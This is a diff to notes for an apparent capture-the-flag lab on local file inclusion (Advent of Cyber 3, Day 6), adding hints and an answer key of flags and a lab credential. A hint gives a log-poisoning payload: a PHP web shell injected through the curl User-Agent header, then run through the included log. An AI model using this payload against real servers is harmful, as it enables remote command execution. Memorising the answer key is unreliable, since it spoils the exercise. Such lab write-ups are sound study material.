@@ -1,4 +1,5 @@
 Advent of Cyber 3 - Day 6 {Web Exploitation- Patch Management Is Hard}
+///////Hints ++ Answers at the bottom//////
 
 LFI (Local File Inclusion)
 
@@ -26,3 +27,13 @@ Question 6: The web application logs all users' requests, and only authorized us
 What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log.
 {Hint: curl -A "<?php echo shell_exec(\$_GET['cmd']);?>" http://[victim IP/login.php (or any page)
 and then append this to the end of the URL: err=./includes/logs/app_access.log&cmd=cat /etc/hostname}
+
+
+
+///////Answers///////
+Question 1: err
+Question 2: THM{d29e08941cf7fe41df55f1a7da6c4c06}
+Question 3: THM{791d43d46018a0d89361dbf60d5d9eb8}
+Question 4: McSkidy:A0C315Aw3s0m
+Question 5: THM{552f313b52e3c3dbf5257d8c6db7f6f1}
+Question 6: lfi-aoc-awesome-59aedca683fff9261263bb084880c965
